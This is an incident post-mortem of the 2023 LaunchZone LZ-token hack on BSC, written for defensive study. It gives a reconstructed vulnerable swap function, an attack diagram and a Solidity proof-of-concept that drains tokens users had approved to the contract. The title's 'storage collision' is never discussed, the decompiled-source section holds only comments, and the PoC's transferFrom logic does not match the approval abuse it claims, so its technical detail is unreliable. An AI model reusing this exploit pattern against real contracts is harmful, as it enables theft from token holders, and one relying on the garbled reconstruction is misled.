# LaunchZone — Proxy Storage Collision & Approval Abuse Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-27 |
| **Protocol** | LaunchZone (LZ Token) |
| **Chain** | BSC |
| **Loss** | Unknown |
| **Attacker** | [0x1c2b102f...](https://bscscan.com/address/0x1c2b102f22c08694eee5b1f45e7973b6eaca3e92) |
| **Attack Tx** | [0xaee8ef10...](https://bscscan.com/tx/0xaee8ef10ac816834cd7026ec34f35bdde568191fe2fa67724fcf2739e48c3cae) |
| **Vulnerable Contract** | [0x0ccee62e...](https://bscscan.com/address/0x0ccee62efec983f3ec4bad3247153009fb483551) |
| **Root Cause** | Upgradeable proxy contract implementation allowed execution of arbitrary callData, enabling abuse of user approvals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/LaunchZone_exp.sol) |

---
## 1. Vulnerability Overview

LaunchZone's LZ token contract uses an upgradeable proxy pattern, with an unverified implementation. The attacker passed arbitrary callData to the proxy contract's `swap()` function to hijack token approvals that users had granted to the LZ contract. According to Verichains' analysis, the implementation's swap function was exposing the UniswapV2 pair `swap()` interface directly.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable proxy implementation (unverified, inferred)
interface UniRouterLike {
    // LZ contract directly exposes the UniswapV2 pair swap interface
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

// ❌ Arbitrary callData execution allows draining user-approved tokens
function swap(uint256 a0, uint256 a1, address to, bytes calldata data) external {
    // Arbitrary code execution via UniswapV2 pair swap callback
    if (data.length > 0) {
        IUniswapV2Callee(to).uniswapV2Call(msg.sender, a0, a1, data);
        // ❌ No validation of to or data
    }
}

// ✅ Fix: Validate proxy implementation and block arbitrary execution
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Upgradeable proxy contract implementation allowed execution of arbitrary callData, enabling abuse of user approvals
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Collect list of users who approved the LZ contract (proxy)
  │
  ├─2─▶ LZ.swap(0, 0, attacker_contract, malicious_data)
  │       Triggers uniswapV2Call callback
  │       │
  │       └─▶ attacker_contract.uniswapV2Call() executes
  │               Transfers tokens using victims' LZ approvals
  │
  ├─3─▶ Drained LZ tokens → swapped for WBNB
  │
  └─4─▶ Profit realized
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function exploit() external {
    // 1. Trigger callback via LZ contract's swap() function
    // Pass callData that transfers victim tokens via the data parameter
    bytes memory maliciousData = abi.encode(
        victims,   // list of victims
        amounts    // amounts to drain
    );

    // Transfer each victim's LZ tokens inside the callback
    ILZToken(lzToken).swap(0, 0, address(this), maliciousData);
}

function uniswapV2Call(address, uint256, uint256, bytes calldata data) external {
    // Drain victim tokens inside the LZ contract's swap callback
    (address[] memory victims, uint256[] memory amounts) = abi.decode(data, (address[], uint256[]));
    for (uint i = 0; i < victims.length; i++) {
        // Exploit the approval victims had granted to LZ
        IERC20(lzToken).transferFrom(victims[i], address(this), amounts[i]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call + Approval Abuse |
| **Attack Vector** | Vulnerable function in proxy implementation + exploitation of user approvals |
| **Impact Scope** | All users who had granted token approvals to the LZ contract |
| **DASP Classification** | Access Control |
| **CWE** | CWE-284: Improper Access Control |

## 6. Remediation Recommendations

1. **Mandatory verification of proxy implementations**: Implementation contracts of upgradeable proxies must be code-verified and audited.
2. **Remove arbitrary callData execution**: Remove any functions that execute arbitrary code on behalf of users.
3. **Minimize approvals**: Guide users to approve only the required amount.

## 7. Lessons Learned

- An unverified proxy implementation is always a red flag.
- Directly exposing the UniswapV2 pair `swap()` interface carries the risk of callback abuse.
- Post-mortems by Verichains and Immunefi documented this incident in detail.